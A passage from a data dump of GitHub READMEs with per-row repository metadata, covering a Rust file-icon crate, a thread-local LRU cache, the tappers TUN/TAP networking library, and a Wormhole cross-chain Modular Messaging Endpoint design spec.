```sh
cargo add devicons
```

_**NOTE**: you'll need to use a [NerdFont](https://www.nerdfonts.com/) to properly display the icons._

## Usage

Here‚Äôs a simple example of how to use `devicons` to retrieve a file icon with the dark theme:

```rust
use std::path::Path;
use devicons::{File, Theme, icon_for_file, FileIcon};

fn main() {
    // getting the icon from a path with a specified theme
    let path = Path::new(""Cargo.toml"");
    let icon = icon_for_file(path, Some(Theme::Dark));

    // getting the icon from a string with a specified theme
    let icon = icon_for_file(""Cargo.toml"", Some(Theme::Dark));

    // getting the icon from a path with the default theme
    let icon = FileIcon::from(path);

    // directly getting an icon from a filename
    let icon = FileIcon::from(""Cargo.toml"");

    println!(""File: {}"", path.to_string_lossy());
    println!(""Icon: {}"", icon.icon);
    println!(""Color: {}"", icon.color);
}
```

### Running the Examples

You can find more usage examples in the `examples` directory. To run them, use:

```bash
cargo run --example <example_name>
```

## License

This project is licensed under the [Apache 2.0 License](LICENSE). 

",0,0,1,Apache-2.0,rust.yml,0.0
a-agmon/LocalLRU,main,"# Local LRU

local_lru is a simple, fast, thread-safe and lock-free implementation of LRU (Least Recently Used) caching in Rust. 
Its speed and thread-safety is based on using thread-local storage rather than locking. 

[![Crates.io](https://img.shields.io/crates/v/local_lru)](https://crates.io/crates/local_lru)
[![Documentation](https://docs.rs/local_lru/badge.svg)](https://docs.rs/local_lru)

Using cache based on thread-local storage is different from other caching strategies. Please read the [Quick Introduction](#quick-introduction) section to understand the differences and decide if this cache is suitable for your use case.

__** Please regularly check for updates, as the API is constantly improving and fixes are being added regularly until a version will be released.**__

## Features

- Thread-safe and lock-free
- High performance with O(1) complexity for cache operations
- Uses thread-local storage for speed and thread-safety
- Includes TTL (Time To Live) expiration
- Supports adding and retrieving structs

## Example Usage

Note that `LocalCache::initialize` only initializes the _parameters_ that set the cache's capacity and ttl. It does _not_ create the cache itself.
The cache will only be lazily created with the initalized params when a thread first accesses the cache with a call to `get_item` or `add_item`. Subsequent calls to `initialize` simply modify the cache parameters, which will only effect threads that did not previously access the cache.

```rust
use local_lru::LocalCache;  
use bytes::Bytes;
// Create a new cache with a capacity of 2 items and a TTL of 60 seconds 
let cache = LocalCache::initialize(2, 60);
// Modify the cache parameters for the current thread
let cache = LocalCache::initialize(2, 0);
// Add an item to the cache
cache.add_item(""key1"", Bytes::from(""value1""));
// Get the item from the cache
assert_eq!(cache.get_item(""key1""), Some(Bytes::from(""value1"")));

// Add a struct to the cache
 #[derive(Debug, Serialize, Deserialize, PartialEq, Clone)]
struct TestStruct {
    field1: String,
    field2: i32,
}
let test_struct = TestStruct {
    field1: ""Hello"".to_string(),
    field2: 42,
};
// Add the struct to the cache
cache.add_struct(""test_key"", test_struct.clone());
// Retrieve the struct from the cache
let ret_struct: Option<TestStruct> = cache.get_struct(""test_key"");
// Assert that the retrieved struct matches the original
assert_eq!(ret_struct, Some(test_struct.clone()));
```


## Quick Introduction

 One of the main challenges with LRU caching is that it invovles a lot of writes and updates of its internal data structures: each get and set operation in LRU cache requires updating of at least one pointer.
 This fact diminishes the famous O(1) complexity of LRU cache operations in multithreaded applications, such as web services, which require synchronization and locking mechanisms to ensure thread-safety and thus significantly harm performance.

 The thread-local strategy allows us to create a fast, thread-safe, and lock-free O(1) cache for the price of using more memory. As such, the cache is suitable for applications that require a high-performance and thread-safe cache, but do not require a large memory footprint.

Using thread-local storage means that each thread has its own cache, and the cache is not shared between threads. This means that a cache item that is added to the cache using one thread will not be accessible to other threads. Users need to be aware of this behavior and design their usage of the cache accordingly. This can be very useful for applications that cache results of database queries, for example. If your app uses 4 threads, then it will have 4 caches stores, one per thread, and for each row you will have to access the database _at most_ 4 times, once per thread. But you will gain in performance and scalability, avoiding locks and mutexes.

## Example using local_lru in an Axum service for caching

 ```rust
 struct CacheItem {
    key: String,
    value: String,
}
#[tokio::main]
async fn main() {
    let cache = Arc::new(LocalCache::initialize(100, 120));
    let app = axum::Router::new()
        .route(""/get/:key"", axum::routing::get(get_key))
        .route(""/post"", axum::routing::post(post_key))
        .with_state(cache);

    let listener = TcpListener::bind(""0.0.0.0:3000"").await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn get_key(
    State(cache): State<Arc<LocalCache>>,
    Path(key): Path<String>,
) -> (StatusCode, String) {
    if let Some(content) = cache.get_item(&key) {
        let content_str = String::from_utf8(content.to_vec()).unwrap();
        let response_str = format!(
            ""{{ \""key\"": \""{}\"", \""value\"": \""{}\"" }}"",
            key, content_str
        );
        (StatusCode::OK, response_str)
    } else {
        (StatusCode::NOT_FOUND, """".to_string())
    }
}
 ```

## Benchmarks

Benchmarking is a very complex task and the results can be very misleading if not done carefully. Please run your own benchmarks to see if this cache is suitable for your use case.   

I'm adding these results just to give you an idea of the cache's performance. Its hard to find cache implementations in Rust with similar properties (thread-safe, in-memory, simple, LRU) so I cannot make a direct comparison.   

I did run some benchmarks using the [moka crate](https://crates.io/crates/moka) which is a wonderful implementation of a high-performance concurrent cache.  

I created 10,000 key-value pairs, and then I measured the time it took for 10 threads to run N iterations, where each iteration consists of randomly picking a key-value pair and then either getting the value from the cache or adding the value to the cache if it doesn't exist.
I measured 1K to 1M iterations X 10 threads and plotted the results.

![benchmarks](assets/bench.png)

As shown in the results, Moka initially outperforms local_lru until around 250,000 iterations per thread. Beyond that point, local_lru becomes faster, and by the time iterations reach 1 million per thread (totaling 10 million), local_lru is nearly twice as fast as Moka. This suggests that avoiding locking mechanisms can significantly boost throughput in high-throughput, multi-threaded scenarios despit the use of thread-local storage which causes many cache misses. 
",0,0,7,,,11.0
pkts-rs/tappers,master,"# Tappers

[![Cross-Platform]][CI Status] [![Latest Version]][crates.io] [![Documentation]][docs.rs] [![v1.70+]][Rust 1.70]

[Cross-Platform]: https://github.com/pkts-rs/tappers/actions/workflows/full_ci.yml/badge.svg
[CI Status]: https://github.com/pkts-rs/tappers/actions
[Documentation]: https://docs.rs/tappers/badge.svg
[docs.rs]: https://docs.rs/tappers/
[Latest Version]: https://img.shields.io/crates/v/tappers.svg
[crates.io]: https://crates.io/crates/tappers
[v1.70+]: https://img.shields.io/badge/MSRV-rustc_1.70+-blue.svg
[Rust 1.70]: https://blog.rust-lang.org/2023/06/01/Rust-1.70.0.html

---

**Tappers is a library for creating, managing and exchanging packets on TUN, TAP and vETH interfaces.**

`tappers` provides both platform-specific and cross-platform APIs for managing TUN/TAP devices and
virtual ethernet (vETH) pairs. It supports the following features for each platform:

| Platform      | TUN  | TAP | vETH |
| ------------- | ---- | --- | ---- |
| Linux         | ‚úÖ   | ‚úÖ  | ‚¨ú   |
| MacOS         | ‚úÖ   | ‚úÖ  | ‚¨ú   |
| Windows       | ‚úÖ   | ‚¨ú  | N/A  |
| FreeBSD       | ‚úÖ   | ‚úÖ  | ‚¨ú   |
| OpenBSD       | ‚úÖ   | ‚úÖ  | ‚¨ú   |
| NetBSD        | ‚úÖ   | ‚úÖ  | ‚¨ú   |
| DragonFly BSD | ‚úÖ   | ‚úÖ  | N/A  |
| Solaris       | ‚¨ú   | ‚¨ú  | N/A  |
| IllumOS       | ‚¨ú   | ‚¨ú  | N/A  |
| AIX           | ‚¨ú   | ‚¨ú  | N/A  |

`N/A` - platform does not provide any virtual Ethernet functionality.

Note that this library is currently a work in progress--more features and platforms will be supported soon!

## Getting Started

To create a TUN device and begin synchronously receiving packets from it:
 
```rust
use std::io;
use std::net::Ipv4Addr;
use tappers::Tun;

let mut tun = Tun::new()?; 
tun.add_addr(Ipv4Addr::new(10, 100, 0, 1))?;
tun.set_up()?; // Enables the TUN device to exchange packets

let mut recv_buf = [0; 65536];

loop {
    let amount = tun.recv(&mut recv_buf)?;
    println!(""Received packet: {:?}"", &recv_buf[0..amount]);
}
```

Tappers additionally allows for more complex configuration of interfaces:

```rust
use std::io;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use tappers::{AddAddressV4, AddAddressV6, AddressInfo, DeviceState, Interface, Tap};

// Select an existing (or new) TAP interface name to open
let tap_name = Interface::new(""tap10"")?;

// Open the TAP device named ""tap10"" (or create it if it doesn't exist)
let mut tap = Tap::new_named(tap_name)?;

// Add a new address with associated info to the TAP device
let new_addr = Ipv4Addr::new(10, 100, 0, 1);
let mut addr_req = AddAddressV4::new(new_addr);
addr_req.set_netmask(24);
addr_req.set_broadcast(Ipv4Addr::new(10, 100, 0, 255));

tap.add_addr(addr_req)?;

// Retrieve information on the IPv4/IPv6 addresses bound to the TAP device
let addrs = tap.addrs()?;
for addr_info in addrs {
    println!(""IP address: {}"", addr_info.address());
    if let Some(netmask) = addr_info.netmask() {
        println!(""Netmask: {}"", netmask);
    }
    if let Some(broadcast) = addr_info.broadcast() {
        println!(""Broadcast: {}"", broadcast);
    }
}

// Remove an address from the TAP device
tap.remove_addr(IpAddr::V4(new_addr))?;

// Configure whether the TAP device performs non-blocking reads/writes
tap.set_nonblocking(true)?;

// Bring the device up to enable packet exchange
tap.set_state(DeviceState::Up);

let mut buf = [0; 65536];

// Receive packets from the interface
let amount = tap.recv(&mut buf)?;

// Send packets over the interface
let amount = tap.send(&buf[..amount])?;

// Bring the device down to disable packet exchange
tap.set_state(DeviceState::Down);

// The TUN device represented by `tun` is automatically be removed from the system when dropped.
```


## Feature Comparison to Similar Libraries

| Feature                                     | `tappers` | `tun`          | `tun2`           | `tun-tap`  | `utuntap` | `tokio-tun` |
| ------------------------------------------- | --------- | -------------- | ---------------- | ---------- | --------- | ----------- |
| Consistent packet format across platforms   | ‚úÖ        | ‚¨ú             | ‚¨ú               | Linux only | ‚¨ú        | Linux only  |
| Uses no subprocess commands (only `ioctl`s) | ‚úÖ        | ‚¨ú             | ‚¨ú               | ‚úÖ         | ‚úÖ        | ‚úÖ          |
| Supports multiple TUN/TAP creation          | ‚úÖ        | Not on Windows | ‚úÖ               | ‚úÖ         | ‚úÖ        | ‚úÖ          |
| IPv4 address assignment                     | ‚úÖ*       | ‚úÖ             | ‚úÖ               | ‚¨ú         | ‚¨ú        | ‚úÖ          |
| IPv6 address assignment                     | ‚úÖ*       | ‚¨ú             | Linux only       | ‚¨ú         | ‚¨ú        | ‚¨ú          |
| Unit testing for `TUN` devices              | ‚úÖ        | ‚úÖ             | ‚úÖ               | ‚úÖ         | ‚úÖ        | ‚¨ú          |
| Unit testing for `TAP` devices              | ‚úÖ        | ‚¨ú             | ‚¨ú               | ‚¨ú         | ‚¨ú        | ‚¨ú          |
| Cross-platform CI testing                   | ‚úÖ        | ‚¨ú             | ‚¨ú               | N/A        | ‚¨ú        | N/A         |
| TUN/TAP support for Linux                   | ‚úÖ        | TUN only       | TUN only         | ‚úÖ         | ‚úÖ        | ‚úÖ          |
| TUN/TAP support for MacOS                   | ‚úÖ        | TUN only       | TUN only         | ‚¨ú         | TUN only  | ‚¨ú          |
| TUN/TAP support for Windows                 | TUN only  | TUN only       | TUN only         | ‚¨ú         | ‚¨ú        | ‚¨ú          |
| TUN/TAP support for *BSD                    | ‚úÖ        | ‚¨ú             | FreeBSD/TUN only | ‚¨ú         | OpenBSD   | ‚¨ú          |
| TUN/TAP support for Solaris/IllumOS         | ‚¨ú        | ‚¨ú             | ‚¨ú               | ‚¨ú         | ‚¨ú        | ‚¨ú          |
| non-`async` support                         | ‚úÖ        | ‚úÖ             | ‚úÖ               | ‚úÖ         | ‚úÖ        | ‚¨ú          |
| `async` support                             | ‚úÖ        | ‚úÖ             | Unix only        | ‚úÖ         | ‚¨ú        | ‚úÖ          |

`*` - `tappers` doesn't currently support setting or deleting IP addresses in Windows. This because
Windows fundamentally lacks support for adding or changing IPv6 interface addresses in current APIs.
This issue will be resolved when I find the time to reverse-engineer whatever opaque ioctl calls the
`netsh` command uses to assign IPv6 addresses to TUN and TAP interfaces.

## Planned Features

The following are currently being worked on or are in the roadmap of near-future releases:

- Support for adding routes to TUN/TAP devices programatically
- Unit tests for `send()`/`recv()` (currently blocking on route support)
- Cross-platform vETH interfaces
- `async` read and write for TUN/TAP/vETH interfaces
- More specific settings for TUN/TAP/vETH interfaces (setting MTU, getting and setting IP metric
  and flags, etc.)
- Windows TAP supported via the openvpn `tap-windows6` driver
- Windows support for programatically adding/removing IP addresses from interfaces
- Solaris/IllumOS support

If one of these features is particularly needed for your use case, feel free to open a Github issue
and I'll try to prioritize its implementation.

## Additional Notes on Platform Support

Not all platforms implement the standard `/dev/tun` interface for TUN/TAP creation; there are
special instances where TUN and TAP devices are provided either through the use of custom drivers
(such as for Windows) or via special alternative network APIs (such as for MacOS). These are
outlined below. The TL;DR is that *nix platforms are supported natively, Windows is supported
as long as extra open-source drivers are installed, and mobile platfroms are too restrictive for
`tappers` to work well with.

### Windows

Windows provides no TUN/TAP interface support by default. Instead, there are two open-source
drivers that provide roughly equivalent functionality: the Wireguard-supported `wintun` driver, and
the OpenVPN-supported `tap-windows6` driver. `wintun` provides only TUN support, whereas
`tap-windows6` provides TAP and ""simulated"" TUN support. In either case, the appropriate driver must
be installed; otherwise, instantiation of `Tun` and `Tap` types will fail with an error.

### MacOS

MacOS provides a kind of TUN interface via the `utun` API, which acts mostly the same as `tun` on
other platforms. While MacOS has no explicit `tap` API, it does have a relatively-undocumented
`feth` interface (see
[if_fake.c](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/net/if_fake.c)) that is
nearly equivalent in functionality to TAP interfaces. Despite its missing documentation, `feth`
interfaces are supported in MacOS releases as early as 10.13 (High Sierra), and their API has
remained relatively stable since its inception.

In short, neither TUN nor TAP interfaces are formally supported on MacOS, but `tappers` provides
equivalent functionality for its `Tun`/`Tap` types via `utun` and `feth`.

### DragonFly BSD

DragonFly does not load the needed `if_tap` module by default. Make sure to load this using
`kldload if_tap` prior to running any program that uses `tappers`. Note that this will only load
the TAP kernel module until the next boot; refer to DragonFly documentation for further information
on how to persistently load kernel modules.

### Android

Android techincally does offer the `/dev/net/tun` API, but it is only accessible to applications
with root privileges. As most Android distributions do not allow applications to run with root
privileges, this is not a feasible solution for most use cases. Android instead offers the
`VpnService` Java API that allows for the creation of a single TUN interface through which traffic
from the device is routed. If your intent is to create a VPN or proxy application, you'll likely
find `VpnService` to be better suited to your needs than this crate. Note that `VpnService` has
no native API equivalent in Android, so `tappers` does not wrap it.

### iOS

iOS provides the `NEPacketTunnelProvider` API for VPN/proxy applications (similar to Android's
`VpnProvider`). iOS does not support the creation of arbitrary TUN interfaces, and it provides no
support for TAP interfaces. `NEPacketTunnelProvider` has no native API equivalent, so `tappers`
does not wrap it.

## Virtual Ethernet (vETH) Pairs

Virtual Ethernet (or vETH) pairs provide link-layer communication between two network interfaces
without any underlying physical hardware. They are particularly useful in virtualization contexts,
though they can also be used to simulate network topologies. `tappers` doesn't support vETH devices
at the moment, but they are a planned feature for the near future.

## `async` Runtime Support

All `Tun` and `Tap` types implement synchronous blocking/nonblocking `send()` and `recv()` APIs.
In addition to this, `tappers` provides first-class support for the following `async`
runtimes:

| `async` Runtime | Supported? |
| --------------- | ---------- |
| `async-std`     | ‚úÖ         |
| `smol`          | ‚úÖ         |
| `mio`           | ‚úÖ*        |
| `tokio`         | ‚úÖ         |

`*` - on all platforms except for Windows

## Dependency Policy

Like other crates managed by pkts.org, `tappers` aims to rely on a minimal set of dependencies
that are vetted and well-used in the Rust ecosystem. As such, `tappers` has only the following
dependencies:

* `libc`, `windows-sys` - Provides needed types and functions for creating/managing TUN/TAP
interfaces across various platforms.
* `once_cell` - Used in Windows implementation of `Tun`/`Tap`. Will be replaced with the standard
library once certain OnceCell APIs are stabilized.

The following optional dependencies are only included when various async runtime features are enabled:
* `async-std` - Included for async compatibility with the `async-std` runtime
* `mio` - Included for async compatibility with the `mio` runtime
* `smol` - Included for async compatibility with the `smol` runtime
* `tokio` - Included for async compatibility with the `tokio` runtime
* `async-io` - Additional dependency for the `async-std` and `smol` runtimes

We do not plan on adding in any additional dependencies to `tappers`. The one exception to this
rule is that some common structs (e.g. `MacAddr`, `Interface`) may be split out into a separate
crate in a future release.

## License

This project is licensed under either of

* [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)
  ([LICENSE-APACHE](https://github.com/rust-lang/libc/blob/HEAD/LICENSE-APACHE))

* [MIT License](https://opensource.org/licenses/MIT)
  ([LICENSE-MIT](https://github.com/rust-lang/libc/blob/HEAD/LICENSE-MIT))

at your option.

## Contributing

`tappers` is open to contribution--feel free to submit an issue or pull request if there's
something you'd like to add to the library.

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in
`tappers` by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without
any additional terms or conditions.
",0,5,3,Apache-2.0,full_ci.yml,35.0
wormholelabs-xyz/example-messaging-endpoint,main,"# Modular Messaging (MM)

## Objective

Provide a protocol agnostic framework for sending and receiving messages that supports flexible path configuration and opt-in upgradeability. The on-chain infrastructure and standardized off-chain components should be provided to minimize integrator effort and responsibility.

## Runtime Support

- [ ] [EVM](https://ethereum.org/en/developers/docs/evm/)
- [ ] [SVM](https://solana.com/developers/evm-to-svm/smart-contracts)
- [ ] [Sui Move](https://sui.io/move)
- [ ] [Aptos Move](https://aptos.dev/en/build/smart-contracts)

## Development

See [DEVELOP.md](./DEVELOP.md).

## Background

The [Wormhole Core](https://github.com/wormhole-foundation/wormhole/blob/main/whitepapers/0001_generic_message_passing.md) bridge offers very flexible and relatively un-opinionated generic message passing. The cost of that flexibility is that it does not inherently provide several widely required integrator features, such as an explicit destination chain and address or replay protection. It is essentially a message attestation and verification protocol only. This leaves all integrators who wish to build unicast messaging implementations to implement this themselves.

[Wormhole's Native Token Transfers](https://github.com/wormhole-foundation/example-native-token-transfers) (NTT) is a framework for integrators to transfer tokens across chains via independent NttManager contract deployments which may leverage multiple Transceivers - a standardized messaging protocol abstraction. The NttManager contract is responsible for transfers of a single token (locking/burning, minting/unlocking), sending/receiving messages via multiple Transceivers, and managing those Transceivers. Today, each integrator must deploy and configure Transceivers themselves. For a Wormhole Transceiver, this includes cross-registering the Manager on the same chain and cross-registering the Transceivers on the other chains.

A marquee feature of NTT is its messaging protocol abstraction, allowing integrators to lever up security or resiliency by choosing multiple transceivers in m of n configurations. For example, Lido chose to use Wormhole and Axelar in a 2-of-2 configuration, and there has been [NTT-specific work](https://github.com/wormhole-foundation/example-native-token-transfers/pull/517) to increase the flexibility of these configurations.

There are many possible messaging products and improvements that exist today or could exist in the future: threshold signatures greatly reducing verification costs, zero-knowledge proofs improving trustlessness, batching messages to improve throughput and decrease cost. However, there does not exist a standardized way to opt-in to adoption of these new improvements.

## Goals

Provide a protocol agnostic framework for sending and receiving messages that supports flexible path configuration and opt-in upgradeability. The on-chain infrastructure and standardized off-chain components should be provided to minimize integrator effort and responsibility.

- A non-upgradeable, non-administrated/owned **Endpoint** which manages integrator Adapter configuration and message state. This abstracts Adapters from Integrators. The goal of the Endpoint is to provide strictly the functionality necessary for agnostically generating and aggregating attestations across multiple protocols.
- An opinionated standard for **Adapter** design. The intention is for these to be safe to share and trust across integrators. The goal of an Adapter is to interface between the Endpoint and a particular messaging / attestation protocol. These are the equivalent of NTT's Transceivers.
- A 1-1 generic messaging framework where on-chain integrators only need to interact directly with one contract for attestation.
- Allow Integrators to define their own, custom thresholding logic.
- Lay the ground work for trustless execution, completely separate from attestation.

Any implementation should prioritize

- Documentation (APIs, wire formats, deployment, verification)
- Testing (aiming for 100% code coverage where possible and complete integration/e2e testing)
- Permissionless-ness and immutability where possible
- Composability
- Discoverability (e.g. off-chain code can determine what configuration and versions on-chain code is using)

## Non-Goals

- Handling complex thresholding logic in the Endpoint.
  - No one size fits all solution. Instead, expose a way for Integrators to define their own rules on their side.
- Managing peers in the Endpoint.
  - This would introduce Integrator/application-specific logic into the Endpoint and make it more difficult for an Integrator to migrate to a new Endpoint. It is more appropriate for accepted peers to be configured at the application level (though standard libraries can be provided for this).
- Pass-through parameters specific to an Adapter.
- Message execution.
- Generically solving relaying on all runtimes.
- Advanced messaging patterns, such as efficient 1-n messaging.
- Dynamic Adapter requirements for the same chain, e.g. between the same chains, sometimes sending via 1 adapter and other times sending via 2. If this is desired, separate sending contracts can be used.
- Time-lock administrative functions. Since the admin can be another on-chain contract, time locks or any other desired governance restrictions can be performed there.

## Overview

```mermaid
---
title: Sending a message
---
sequenceDiagram
		participant C as Client
		box blue Source Chain
		  participant I as Integrator Contract
		  participant E as Endpoint
      participant A1 as Adapter 1
      participant A2 as Adapter 2
		end
    C->>I: sendMessage(dstChain)
    I->>E: endpoint.sendMessage(dstChain, dstAddress, payloadHash)
    E->>E: getConfig(msg.sender, dstChain)
    E->>A1: a1.sendMessage
    E->>A2: a2.sendMessage
    E-->>I: sequence
```

```mermaid
---
title: Receiving a message
---
sequenceDiagram
		participant R as Relayer(s)
		box purple Destination Chain
      participant A1 as Adapter 1
      participant A2 as Adapter 2
		  participant I as Integrator Contract
      participant E as Endpoint
		end
    par relay for adapter 1
    R->>A1: attestMessage
    A1->>E: attestMessage
    E->>E: getConfig(msg.sender, srcChain)
    E->>E: updateStatus(msg.sender, ...)
    and relay for adapter 2
    R->>A2: attestMessage
    A2->>E: attestMessage
    E->>E: getConfig(msg.sender, srcChain)
    E->>E: updateStatus(msg.sender, ...)
    end
    R->>I: receiveMessage
    I->>E: endpoint.receiveMessage
    E->>E: setStatus
    E-->>I: enabledBitmap, attestedBitmap
```

## Detailed Design

Broadly, the design is to split the generic message passing and adapter logic from NTT into a sharable piece of infrastructure, referred to here as Endpoint. For this to be effective, Adapters must adhere to a stricter design standard.

All implementations should prioritize the following best practices:

- Minimize the number of functions / instructions that modify the same state
- Minimize branching logic
- Revert with unique errors for each unique condition

### Technical Details

#### Terminology

> The following variable / parameter naming conventions are in camel case and should be adapted to the implementation's programming language standards accordingly.

Admin - `admin` - The designated public key / address / etc (as applicable to the given runtime) which can perform the administrative functions on behalf of an Integrator.

Message - `message` - A cross-chain message, consisting of a Source Chain and Address, Sequence, Destination Chain and Address, and Payload. The Endpoint only attests to the hash of that Payload.

Source Chain - `srcChain` - The Wormhole Chain ID (`u16`) of the sending / emitting chain.

Source Address - `srcAddr` - The UniversalAddress (`bytes32`) representation (according to the Wormhole specification) of the sending Integrator address.

Sequence - `sequence` - The auto-incremented `u64` on each message sent by an Integrator

Destination Chain - `dstChain` - The Wormhole Chain ID (`u16`) of the intended recipient chain.

Destination Address - `dstAddr` - The UniversalAddress (`bytes32`) representation of the intended recipient Integrator address.

Payload - `payload` - A message payload of arbitrary bytes, encoded by the Integrator, intended to reach the destination chain / address.

Payload Hash - `payloadHash` - The `keccak256` (`bytes32`) of the message `payload`.

Message Hash - `messageHash` - The `keccak256` (`bytes32`) of the concatenated `srcChain`, `srcAddr`, `sequence`, `dstChain`, `dstAddr`, `payloadHash` (in that order).

Send Adapter - `sendAdapter` - An Adapter enabled to send messages for a given Integrator _to_ a given Destination Chain.

Receive Adapter - `recvAdapter` - An Adapter enabled to attest to messages for a given Integrator _from_ a given Source Chain.

Outstanding Adapter - `outstandingAdapter` - On implementations which require Adapters to pull outgoing messages, a Send Adapter _at the time of message generation_ which has not yet picked up a given message.

#### Endpoint

- MUST be non-upgradeable, non-""pause""-able, and non-administrated/owned. It should be able to be trusted by being completely trustless.
- MUST store configuration per-integrator.
- MUST support initial Integrator registration to configure an administrator.
- MUST support transferring administrator, including explicitly discarding it [*admin only*].
  - MUST support two-step admin transfer, where the new administrator MAY accept the transfer OR the existing administrator MAY cancel the transfer.
  - MUST also support one-step admin transfer, where the new administrator immediately replaces the admin. This may be used to better support emergency-only multi-sigs or governance contracts which are not-yet complete or their governance does not wish to explicitly issue an acceptance.
- MUST support 128 Adapters, per-integrator, in an append-only fashion [*admin only*].
- MUST configure send and receive Adapters independently, per-chain [*admin only*].
- MUST track an unsigned 64-bit sequence number per-integrator.
- MUST handle replay protection for the Integrator.
- MUST handle replay protection on attestations for an Adapter.
- MUST allow additional attestations on messages which have been executed.
- MUST allow for the integrator to perform custom thresholding logic.
- MUST allow for integrators to add any Adapter to their configuration.
- MUST allow for off-chain configuration discoverability.
- MUST NOT handle message execution, so as to provide for a clear separation of concerns. Message execution can be handled via a disparate relaying protocol.

#### Adapters

- MUST be non-upgradeable.
- MUST be append-only (i.e. existing configuration cannot be changed once set).
- MUST be associated with EXACTLY one Endpoint.
- SHOULD avoid branching logic. They should serve exactly one, direct purpose.
- SHOULD be non-administered, if possible (e.g. OP Stack Native Bridge).
- SHOULD automatically relay attestations.

#### Integrators

- MUST initially register with the Endpoint to reserve any necessary state and set their admin, which MAY be their own address.

#### Message Flow

Generally, messages make the following journey:

- Send [on the *source* chain]
  - An Integrator pushes the message payload hash and recipient (destination chain and address) to the Endpoint.
  - The Endpoint provides the payload and metadata to the configured Adapters for that destination chain.
  - Each Adapter serializes the message info and sends it to a corresponding Adapter on the destination chain via their protocol.
- Attest [off-chain - the *destination* chain]
  - Each protocol posts the message to the destination chain Adapter which verifies the message and submits its attestation to the Endpoint
- Receive [on the *destination* chain]
  - A relayer executes the Integrator which _pulls_ the attestations from the Endpoint, marking the message as received.

### API / database schema

#### Endpoint

The Endpoint MUST store the following information.

```solidity
// Integrator => config
mapping(address => IntegratorConfig) perIntegratorConfig;

// This may look different depending on the chain, on EVM something like this
// is necessary to determine the difference between an unregistered integrator
// and one who has discarded their admin (set it to the 0 address).
struct IntegratorConfig {
  bool isInitialized;
  address admin;
}

// Integrator => an array of Adapters, max length 128
mapping(address => address[]) perIntegratorAdapters;

// Integrator (message sender) => chainId => bitmap corresponding to index in perIntegratorAdapters
mapping(address => mapping(uint16 => uint128)) perIntegratorPerChainSendAdapters;
// OR Integrator (message sender) => chainId => array of Adapter addresses
// whichever is most efficient (e.g. on Ethereum it is better to pre-compute
// the array whereas Solana needs to track which adapter has picked up a message)
mapping(address => mapping(uint16 => address[])) perIntegratorPerChainSendAdapters;

// Integrator (message recipient) => chainId => bitmap corresponding to index in perIntegratorAdapters
mapping(address => mapping(uint16 => uint128)) perIntegratorPerChainRecvAdapters;

// Integrator (message sender) => sequence number
mapping(address => uint64) perIntegratorSequence;

// Integrator (message recipient) => message digest -> attestation info
mapping(address => mapping(bytes32 => AttestationInfo)) perIntegratorAttestations;

struct AttestationInfo {
  bool executed;                // replay protection
  uint128 attestedAdapters; // bitmap corresponding to perIntegratorAdapters
}
```

When sending a message, the Endpoint MUST provide the Adapters with the following information.

```solidity
bytes32 sourceAddress      // UniversalAddress of the message sender (integrator)
uint64  sequence           // Next sequence number for that integrator (consuming the sequence number)
uint16  destinationChainId // Wormhole Chain ID
bytes32 destinationAddress // UniversalAddress of the message recipient (integrator on destination chain)
bytes32 payloadHash        // keccak256 of arbitrary payload from the integrator
```

When attesting to (receiving) a message, the Adapter MUST provide the Endpoint with the following information.

```solidity
uint16  sourceChain        // Wormhole Chain ID
bytes32 sourceAddress      // UniversalAddress of the message sender (integrator)
uint64  sequence           // Next sequence number for that integrator (consuming the sequence number)
uint16  destinationChainId // Wormhole Chain ID
bytes32 destinationAddress // UniversalAddress of the message recipient (integrator on destination chain)
bytes32 payloadHash        // keccak256 of arbitrary payload from the integrator
```

The Endpoint MUST calculate the message digest as

```solidity
keccak256(abi.encodePacked(sourceChain, sourceAddress, sequence, destinationChain, destinationAddress, payloadHash));
```

Generally, Integrators (and the public) will require getters (as applicable) for all state.

Every one of the following methods MUST generate traceable events.

The Endpoint MUST contain the following functionality for an Integrator:

- `register(initialAdmin)`
  - MUST check that the caller (Integrator) is not already registered.
  - If possible, MUST check that the admin is potentially valid / non-null (e.g. `initialAdmin != address(0)` on EVM).
  - In general, it is up to the Integrator to ensure the validity of the admin address.
  - Initializes their registration and sets the initial admin.
- `sendMessage(dstChain, dstAddr, payloadHash)` ‚Üí `sequence`
  - MUST have at least one enabled **send** Adapter for `dstChain`.
  - Increments the Integrator's sequence and performs the steps to send the message or prepare it for sending, as applicable.
  - If Adapters must pull outgoing messages in the given implementation (via `pickUpMessage`), the Endpoint MUST set the current enabled Send Adapters as the Outstanding Adapters for that message.
- `getMessageStatus(srcChain, srcAddr, sequence, dstChain, dstAddr, payloadHash)` ‚Üí `enabledBitmap, attestedBitmap, numAttested, executed`
  - Returns the enabled receive Adapters for that chain along with the attestation information and the executed flag.
- `recvMessage(srcChain, srcAddr, sequence, dstChain, dstAddr, payloadHash)` ‚Üí `enabledBitmap, attestedBitmap, numAttested`
  - MUST check that at least one Adapter has attested.
  - MUST revert if already executed.
  - Marks the message as executed and returns the enabled receive Adapters for that chain along with the attestations.
  - NOTE: for efficiency, this combines `getMessageStatus` and `execMessage` into one call and is expected to be the primary way that Integrators receive messages.
    - If they do not wish for the Endpoint to perform replay protection, they may simply use `getMessageStatus`.
    - If they need to explicitly mark a message as executed regardless of its attestation state, they may use `execMessage`.
- `execMessage(srcChain, srcAddr, sequence, dstChain, dstAddr, payloadHash)`
  - MUST revert if already executed.
  - MUST NOT require any Adapters to have attested
  - Marks the message as executed.

The Endpoint MUST contain the following functionality for an Adapter

- `attestMessage(srcChain, srcAddr, sequence, dstChain, dstAddr, payloadHash)`
  - MUST check that the Adapter is an enabled **receive** Adapter for the Integrator (`dstAddr`) and **source** chain (`srcChain`).
  - MUST check that the Adapter has NOT already attested.
  - MUST allow an Adapter to attest after message execution.
  - Calculates the message hash and marks the Adapter as having attested to the message.

The Endpoint MAY contain the following functionality for an Adapter, if the implementation cannot arbitrarily call `sendMessage` on an Adapter (e.g. Solana, Sui, Aptos).

- `pickUpMessage(srcAddr, sequence)` ‚Üí `dstChain, dstAddr, payloadHash`
  - MUST check that the Adapter is an enabled **send** Adapter for the Integrator (`srcAddr`) and **destination** chain (`dstChain`).
  - MUST check that the Adapter has NOT already picked up the message.
  - Marks the Adapter as having picked up the message.
